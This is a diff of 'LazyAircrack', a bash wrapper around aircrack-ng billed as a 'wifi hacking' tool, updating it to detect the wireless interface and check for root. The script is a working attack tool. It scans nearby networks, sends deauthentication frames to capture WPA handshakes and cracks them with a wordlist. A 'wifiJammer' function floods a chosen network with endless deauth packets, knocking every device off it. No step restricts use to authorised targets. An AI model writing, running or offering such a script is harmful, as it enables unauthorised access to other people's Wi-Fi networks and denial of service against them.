@@ -1,6 +1,5 @@
 #!/bin/bash
 
-clear
 Red="\e[1;91m"      ##### Colors Used #####
 Green="\e[0;92m"
 Yellow="\e[0;93m"
@@ -8,19 +7,41 @@ Blue="\e[1;94m"
 White="\e[0;97m"
 
 handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####
+wifiInterface="wlan0"
+wifiInterfaceMon="${wifiInterface}mon"
+
+checkRoot () {        ##### Check if user is root or not #####
+if ! [ $(id -u) = 0 ]; then
+banner
+echo -e "\n\n${White}[${Red}LazyAircrack${White}] Please run the tool as root or use sudo.\n"
+exit 1
+fi
+clear
+}
 
 checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
 if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
-echo "Installing aircrack-ng\n\n"
-sudo apt-get install aircrack-ng;
+echo -e "[${Red}Status${White}] Found missing dependencies..."
+echo -e "[${Green}Status${White}] Installing aircrack-ng...\n"
+apt-get install aircrack-ng -y
 fi
 }
 
-checkWiFiStatus () {        ##### Check if wlan0 is enabled or not #####
+getWiFiInterface () {        ##### Get name of system WiFi interface #####
+if [ $(airmon-ng | grep -c "phy0") -eq 0 ]; then
+banner
+echo -e "\n\n${White}[${Red}LazyAircrack${White}] No WiFi Interface found to continue.\n"
+exit 1
+fi
+wifiInterface=`airmon-ng | grep "phy0" | awk '{print $2}'`
+wifiInterfaceMon="${wifiInterface}mon"
+}
+
+checkWiFiStatus () {        ##### Check if WiFi interface is enabled or not #####
 WiFiStatus=`nmcli radio wifi`
 if [ "$WiFiStatus" == "disabled" ]; then
 nmcli radio wifi on
-echo -e "[${Green}wlan0${White}] Enabled!"
+echo -e "[${Green}${wifiInterface}${White}] Enabled!"
 fi
 }
 
@@ -36,7 +57,7 @@ echo -e "${Red}
 echo -e "${Yellow} \n             A lazy script for aircrack-ng, wifi hacking.
       The script only works if your wifi adapter has monitor mode."
 echo -e "${Green}\n                    Developed by: Sandesh (3xploitGuy)"
-echo -e "${Green}                         Version: 2.0 Stable"
+echo -e "${Green}                         Version: 2.1 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -55,7 +76,7 @@ case $option in
      wifiJammer
      exit 0
      ;;
-  3) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  3) echo -e "${Red}\nThank You for using the script,\nHappy Hacking ${White}:)\n"
      exit 0
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
@@ -66,9 +87,9 @@ done
 
 wifiHacking () {        ##### Sending DeAuth and capture handshake #####
 monitor
-airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
-echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
-x-terminal-emulator -e aireplay-ng --deauth 20 -a $bssid wlan0mon
+airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $wifiInterfaceMon > /dev/null &
+echo -e "[${Green}${wifiInterfaceMon}${White}] Sending DeAuth to target..."
+x-terminal-emulator -e aireplay-ng --deauth 20 -a $bssid $wifiInterfaceMon
 wordlist
 echo -e "[${Green}Status${White}] Waiting for Handshake Packet..."
 counter=0
@@ -84,7 +105,7 @@ echo -e "[${Red}!${White}] Can't find Handshake, waiting ..."
 counter=$((counter+1))
 done
 kill $!
-airmon-ng stop wlan0mon > /dev/null
+airmon-ng stop $wifiInterfaceMon > /dev/null
 rm handshake-01.cap
 if grep "unable" logs/error > /dev/null; then
 echo -e "[${Red}$targetName${White}] Exiting can't find Handshake Packet..."
@@ -127,18 +148,18 @@ wordlist
 
 wifiJammer () {        ##### Sending unlimited DeAuth #####
 monitor
-airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!  
+airodump-ng --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 5 ; kill $!  
 echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
 sleep 0.5
 echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
-aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
+aireplay-ng --deauth 0 -a $bssid $wifiInterfaceMon > /dev/null
 }
 
 monitor () {        ##### Monitor mode, scan available networks & select target #####
 spinner &
-airmon-ng start wlan0 > /dev/null
-trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
-airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
+airmon-ng start $wifiInterface > /dev/null
+trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 20 ; kill $!
 sed -i '1d' generated-01.kismet.csv
 kill %1
 echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
@@ -157,17 +178,19 @@ echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
 
 spinner() {        ##### Animation while scanning for available networks #####
 sleep 2
-echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
+echo -e "[${Green}${wifiInterfaceMon}${White}] Preparing for scan..."
 sleep 3
 spin='/-\|'
 length=${#spin}
 while sleep 0.1; do
-echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
+echo -ne "[${Green}${wifiInterfaceMon}${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
 done
 }
 
 lazyaircrack () {
+checkRoot
 checkDependencies
+getWiFiInterface
 checkWiFiStatus
 banner
 menu
